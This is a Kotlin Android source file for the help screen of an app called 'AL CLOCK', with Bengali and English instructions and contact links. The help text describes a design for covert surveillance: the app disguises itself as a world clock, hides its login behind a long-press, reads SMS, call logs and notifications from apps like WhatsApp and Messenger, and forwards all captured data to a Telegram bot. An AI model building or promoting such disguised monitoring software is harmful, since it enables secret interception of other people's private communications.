// HelpActivity.kt (সম্পূর্ণ আপডেট করা কোড)
package com.example.alsmsrecive

import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.widget.Button
import android.widget.ImageButton
import android.widget.ImageView
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity

class HelpActivity : AppCompatActivity() {

    private lateinit var btnBack: ImageButton
    private lateinit var btnLangToggle: Button
    private lateinit var tvHelpTitleText: TextView

    // কন্টেন্ট ভিউ
    private lateinit var tvHelpIntroTitle: TextView
    private lateinit var tvHelpIntroDesc: TextView
    private lateinit var tvHelpDisguiseTitle: TextView
    private lateinit var tvHelpDisguiseDesc: TextView
    private lateinit var tvHelpHubTitle: TextView
    private lateinit var tvHelpHubDesc: TextView
    private lateinit var tvHelpPermissionsTitle: TextView
    private lateinit var tvHelpPermissionsDesc: TextView
    private lateinit var tvHelpTelegramTitle: TextView
    private lateinit var tvHelpTelegramDesc: TextView
    private lateinit var tvHelpAppsTitle: TextView
    private lateinit var tvHelpAppsDesc: TextView

    // *** নতুন ভেরিয়েবল (Trash) ***
    private lateinit var tvHelpTrashTitle: TextView
    private lateinit var tvHelpTrashDesc: TextView

    // ছবি (ImageViews)
    private lateinit var imgGuide1: ImageView
    private lateinit var imgGuide2: ImageView
    // *** নতুন ImageView ভেরিয়েবল ***
    private lateinit var imgGuideHub: ImageView
    private lateinit var imgGuideApps: ImageView
    private lateinit var imgGuideTrash: ImageView

    // *** পারমিশন ImageView (পুনরায় যোগ করা হলো) ***
    private lateinit var imgGuidePermissions: ImageView


    // কন্টাক্ট ভিউ
    private lateinit var tvHelpContactTitle: TextView
    private lateinit var btnWhatsApp: Button
    private lateinit var btnWebsite: Button
    private lateinit var tvTerms: TextView
    private lateinit var tvPrivacy: TextView

    private var isBengali = false // ডিফল্ট ভাষা ইংরেজি

    // --- (বাংলা লেখাগুলো অপরিবর্তিত) ---
    private val bn_title_help_page = "সাহায্য ও নির্দেশিকা"
    private val bn_lang_toggle = "English"
    private val en_lang_toggle = "বাংলা দেখুন"
    private val bn_help_intro_title = "অ্যাপটি যেভাবে কাজ করে"
    private val bn_help_intro_desc = "এই অ্যাপটির (\"AL CLOCK\") দুটি মোড রয়েছে: একটি 'ওয়ার্ল্ড ক্লক' ছদ্মবেশী মোড এবং একটি 'সিকিউরিটি হাব'। এটি যেভাবে ব্যবহার করবেন:"
    private val bn_help_disguise_title = "১. ছদ্মবেশী মোড (ওয়ার্ল্ড ক্লক)"
    private val bn_help_disguise_desc = "আপনি লগ আউট থাকা অবস্থায়, অ্যাপটি একটি সাধারণ 'ওয়ার্ল্ড ক্লক' হিসাবে দেখা যাবে। আসল লগইন পেজে যেতে হলে, আপনাকে অবশ্যই **'World Clock' টাইটেল বারটি চেপে ধরে রাখতে হবে (লং-প্রেস)**।"
    private val bn_help_hub_title = "২. সিকিউরিটি হাব (মূল অ্যাপ)"
    private val bn_help_hub_desc = "লগইন করার পর, আপনি সিকিউরিটি হাবে প্রবেশ করবেন। এটি আপনার কন্ট্রোল সেন্টার যেখানে আপনার সিঙ্ক করা সমস্ত ডেটা প্রদর্শিত হবে। অ্যাপটি কাজ করার জন্য আপনাকে অবশ্যই **মেনু (☰)** থেকে পারমিশনগুলো চালু করতে হবে।"
    private val bn_help_permissions_title = "৩. পারমিশন চালু করা"
    private val bn_help_permissions_desc = "আপনি মেনু থেকে ম্যানুয়ালি পারমিশন না দেওয়া পর্যন্ত অ্যাপটি কোনো ডেটা পড়তে পারবে না:\n\n• **Enable SMS Permission:** অ্যাপটিকে নতুন SMS পড়ার অনুমতি দেয়।\n\n• **Enable Notification Access:** অ্যাপটিকে অন্যান্য অ্যাপের নোটিফিকেশন পড়ার অনুমতি দেয়।\n\n• **Enable Call Log Sync:** অ্যাপটিকে আপনার কল হিস্ট্রি পড়ার অনুমতি দেয়।"
    private val bn_help_telegram_title = "৪. টেলিগ্রাম অ্যালার্ট যেভাবে পাবেন"
    private val bn_help_telegram_desc = "রিয়েল-টাইম অ্যালার্ট পাওয়ার জন্য, আপনাকে অবশ্যই আপনার বট টোকেন এবং চ্যাট আইডি দিতে হবে।\n\n১. **মেনু > Telegram Settings**-এ যান।\n২. **BotFather** এবং **userinfobot** থেকে আপনার টোকেন ও আইডি সংগ্রহ করার জন্য স্ক্রিনের নির্দেশনা অনুসরণ করুন।\n৩. তথ্যগুলো সেভ করুন। অ্যাপটি এখন থেকে সব নতুন ডেটা আপনার টেলিগ্রাম অ্যাকাউন্টে ফরোয়ার্ড করবে।"
    private val bn_help_apps_title = "৫. নোটিফিকেশনের জন্য অ্যাপ নির্বাচন"
    private val bn_help_apps_desc = "অ্যাপটি ডিফল্টরূপে সব নোটিফিকেশন ক্যাপচার করবে না। কোন অ্যাপগুলো মনিটর করতে হবে তা আপনাকে বলে দিতে হবে:\n\n১. নোটিফিকেশন অ্যাক্সেস চালু করার পর, **মেনু > Select Apps for Notification**-এ যান।\n২. আপনি যে অ্যাপগুলো (যেমন WhatsApp, Messenger) মনিটর করতে চান তা চেক করুন এবং 'Save' চাপুন।"
    private val bn_help_trash_title = "৬. পুনরুদ্ধার ও ডিলিট করা"
    private val bn_help_trash_desc = "সিকিউরিটি হাব থেকে ডিলিট করা মেসেজগুলো ট্র্যাশে (মেনু > ভিউ ট্র্যাশ) চলে যায়। এখান থেকে, আপনি সেগুলি পুনরুদ্ধার করতে পারেন বা স্থায়ীভাবে ডিলিট করতে পারেন।"
    private val bn_help_contact_title = "যোগাযোগ ও সাপোর্ট"
    private val bn_btn_whatsapp = "WhatsApp-এ যোগাযোগ করুন (01981475404)"
    private val bn_btn_website = "ওয়েবসাইট দেখুন (lolvaialamin.site)"
    private val bn_tv_terms = "শর্তাবলী"
    private val bn_tv_privacy = "গোপনীয়তা নীতি"

    // --- (ইংরেজি লেখাগুলো অপরিবর্তিত) ---
    private val en_title_help_page = "Help & Guide"
    private val en_help_intro_title = "How This App Works"
    private val en_help_intro_desc = "This app (\"AL CLOCK\") has two modes: a 'World Clock' disguise and a 'Security Hub'. Here’s how to use it:"
    private val en_help_disguise_title = "1. The Disguise Mode (World Clock)"
    private val en_help_disguise_desc = "When you are logged out, the app appears as a simple 'World Clock'. To access the real login page, you must long-press (press and hold) the 'World Clock' title bar."
    private val en_help_hub_title = "2. The Security Hub (Main App)"
    private val en_help_hub_desc = "After logging in, you enter the Security Hub. This is your control center where all your synced data appears. From the Menu (☰), you must grant permissions for the app to work."
    private val en_help_permissions_title = "3. Enabling Permissions"
    private val en_help_permissions_desc = "The app CANNOT read any data until you manually grant permissions from the menu:\n\n• Enable SMS Permission: Allows the app to read new SMS messages.\n\n• Enable Notification Access: Allows the app to read notifications from other apps.\n\n• Enable Call Log Sync: Allows the app to read your call history."
    private val en_help_telegram_title = "4. How to Get Telegram Alerts"
    private val en_help_telegram_desc = "To get real-time alerts on Telegram, you must provide your Bot Token and Chat ID.\n\n1. Go to Menu > Telegram Settings.\n2. Follow the on-screen instructions to get your credentials from BotFather and userinfobot.\n3. Save the credentials. The app will now forward all new data to your Telegram account as shown here."
    private val en_help_apps_title = "5. Selecting Apps for Notifications"
    private val en_help_apps_desc = "The app won't capture all notifications by default. You must tell it which apps to watch:\n\n1. After enabling Notification Access, go to Menu > Select Apps for Notification.\n2. Check the apps (like WhatsApp, Messenger) you want to monitor and press 'Save'."
    private val en_help_trash_title = "6. Restoring & Deleting"
    private val en_help_trash_desc = "Messages deleted from the Security Hub are moved to the Trash (Menu > View Trash). From here, you can restore them or delete them forever."
    private val en_help_contact_title = "Contact & Support"
    private val en_btn_whatsapp = "Contact on WhatsApp (01981475404)"
    private val en_btn_website = "Visit Website (lolvaialamin.site)"
    private val en_tv_terms = "Terms & Conditions"
    private val en_tv_privacy = "Privacy Policy"
    // ------------------------------------------

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_help)

        bindViews()

        btnBack.setOnClickListener { finish() }
        btnLangToggle.setOnClickListener {
            toggleLanguage()
        }

        btnWhatsApp.setOnClickListener {
            openWhatsApp()
        }
        btnWebsite.setOnClickListener {
            openWebsite()
        }
        tvTerms.setOnClickListener {
            openLegalPage("TERMS", if (isBengali) bn_tv_terms else en_tv_terms)
        }
        tvPrivacy.setOnClickListener {
            openLegalPage("PRIVACY", if (isBengali) bn_tv_privacy else en_tv_privacy)
        }

        updateTexts()
    }

    private fun bindViews() {
        btnBack = findViewById(R.id.btnHelpBack)
        btnLangToggle = findViewById(R.id.btnLangToggle)
        tvHelpTitleText = findViewById(R.id.tvHelpTitleText)

        tvHelpIntroTitle = findViewById(R.id.tvHelpIntroTitle)
        tvHelpIntroDesc = findViewById(R.id.tvHelpIntroDesc)
        tvHelpDisguiseTitle = findViewById(R.id.tvHelpDisguiseTitle)
        tvHelpDisguiseDesc = findViewById(R.id.tvHelpDisguiseDesc)
        tvHelpHubTitle = findViewById(R.id.tvHelpHubTitle)
        tvHelpHubDesc = findViewById(R.id.tvHelpHubDesc)
        tvHelpPermissionsTitle = findViewById(R.id.tvHelpPermissionsTitle)
        tvHelpPermissionsDesc = findViewById(R.id.tvHelpPermissionsDesc)
        tvHelpTelegramTitle = findViewById(R.id.tvHelpTelegramTitle)
        tvHelpTelegramDesc = findViewById(R.id.tvHelpTelegramDesc)
        tvHelpAppsTitle = findViewById(R.id.tvHelpAppsTitle)
        tvHelpAppsDesc = findViewById(R.id.tvHelpAppsDesc)

        // *** নতুন ভিউ বাইন্ড করা (Trash) ***
        tvHelpTrashTitle = findViewById(R.id.tvHelpTrashTitle)
        tvHelpTrashDesc = findViewById(R.id.tvHelpTrashDesc)


        // ছবি বাইন্ড করুন
        imgGuide1 = findViewById(R.id.imgGuide1)
        imgGuide2 = findViewById(R.id.imgGuide2)
        // *** নতুন ছবি বাইন্ড করা ***
        imgGuideHub = findViewById(R.id.imgGuideHub)
        imgGuideApps = findViewById(R.id.imgGuideApps)
        imgGuideTrash = findViewById(R.id.imgGuideTrash)

        // *** পারমিশন ImageView বাইন্ড (পুনরায় যোগ করা হলো) ***
        imgGuidePermissions = findViewById(R.id.imgGuidePermissions)


        // কন্টাক্ট ভিউ বাইন্ড করুন
        tvHelpContactTitle = findViewById(R.id.tvHelpContactTitle)
        btnWhatsApp = findViewById(R.id.btnWhatsApp)
        btnWebsite = findViewById(R.id.btnWebsite)
        tvTerms = findViewById(R.id.tvTerms)
        tvPrivacy = findViewById(R.id.tvPrivacy)

        // *** এখানে আপনার ছবিগুলো সেট করুন ***
        // (নিশ্চিত করুন যে এই নামের ছবিগুলো res/drawable ফোল্ডারে আছে)
        imgGuide1.setImageResource(R.drawable.guide_world_clock)
        imgGuideHub.setImageResource(R.drawable.guide_security_hub)

        // *** পারমিশন ছবিটি সেট করা হলো ***
        imgGuidePermissions.setImageResource(R.drawable.guide_telegram_setting)

        // *** আপনার অনুরোধ অনুযায়ী ছবিটি অ্যাডজাস্ট করা হলো ***
        imgGuide2.setImageResource(R.drawable.telegram_message_example) // <-- পরিবর্তিত লাইন

        imgGuideApps.setImageResource(R.drawable.guide_select_apps)
        imgGuideTrash.setImageResource(R.drawable.guide_trash_view)
    }

    private fun toggleLanguage() {
        isBengali = !isBengali
        updateTexts()
    }

    private fun updateTexts() {
        if (isBengali) {
            tvHelpTitleText.text = bn_title_help_page
            btnLangToggle.text = bn_lang_toggle
            tvHelpIntroTitle.text = bn_help_intro_title
            tvHelpIntroDesc.text = bn_help_intro_desc
            tvHelpDisguiseTitle.text = bn_help_disguise_title
            tvHelpDisguiseDesc.text = bn_help_disguise_desc
            tvHelpHubTitle.text = bn_help_hub_title
            tvHelpHubDesc.text = bn_help_hub_desc
            tvHelpPermissionsTitle.text = bn_help_permissions_title
            tvHelpPermissionsDesc.text = bn_help_permissions_desc
            tvHelpTelegramTitle.text = bn_help_telegram_title
            tvHelpTelegramDesc.text = bn_help_telegram_desc
            tvHelpAppsTitle.text = bn_help_apps_title
            tvHelpAppsDesc.text = bn_help_apps_desc
            // *** নতুন লেখা সেট করা (Trash) ***
            tvHelpTrashTitle.text = bn_help_trash_title
            tvHelpTrashDesc.text = bn_help_trash_desc

            tvHelpContactTitle.text = bn_help_contact_title
            btnWhatsApp.text = bn_btn_whatsapp
            btnWebsite.text = bn_btn_website
            tvTerms.text = bn_tv_terms
            tvPrivacy.text = bn_tv_privacy
        } else {
            tvHelpTitleText.text = en_title_help_page
            btnLangToggle.text = en_lang_toggle
            tvHelpIntroTitle.text = en_help_intro_title
            tvHelpIntroDesc.text = en_help_intro_desc
            tvHelpDisguiseTitle.text = en_help_disguise_title
            tvHelpDisguiseDesc.text = en_help_disguise_desc
            tvHelpHubTitle.text = en_help_hub_title
            tvHelpHubDesc.text = en_help_hub_desc
            tvHelpPermissionsTitle.text = en_help_permissions_title
            tvHelpPermissionsDesc.text = en_help_permissions_desc
            tvHelpTelegramTitle.text = en_help_telegram_title
            tvHelpTelegramDesc.text = en_help_telegram_desc
            tvHelpAppsTitle.text = en_help_apps_title
            tvHelpAppsDesc.text = en_help_apps_desc
            // *** নতুন লেখা সেট করা (Trash) ***
            tvHelpTrashTitle.text = en_help_trash_title
            tvHelpTrashDesc.text = en_help_trash_desc

            tvHelpContactTitle.text = en_help_contact_title
            btnWhatsApp.text = en_btn_whatsapp
            btnWebsite.text = en_btn_website
            tvTerms.text = en_tv_terms
            tvPrivacy.text = en_tv_privacy
        }
    }

    private fun openWhatsApp() {
        try {
            val intent = Intent(Intent.ACTION_VIEW)
            intent.data = Uri.parse("https://wa.me/8801981475404") // +88 কান্ট্রি কোড
            startActivity(intent)
        } catch (e: Exception) {
            showToast("WhatsApp not installed.")
        }
    }

    private fun openWebsite() {
        try {
            val intent = Intent(Intent.ACTION_VIEW)
            intent.data = Uri.parse("https://lolvaialamin.site")
            startActivity(intent)
        } catch (e: Exception) {
            showToast("No web browser found.")
        }
    }

    private fun openLegalPage(pageType: String, title: String) {
        val intent = Intent(this, LegalActivity::class.java).apply {
            putExtra("PAGE_TYPE", pageType) // "TERMS" বা "PRIVACY"
            putExtra("EXTRA_TITLE", title)
        }
        startActivity(intent)
    }

    private fun showToast(message: String) {
        Toast.makeText(this, message, Toast.LENGTH_SHORT).show()
    }
}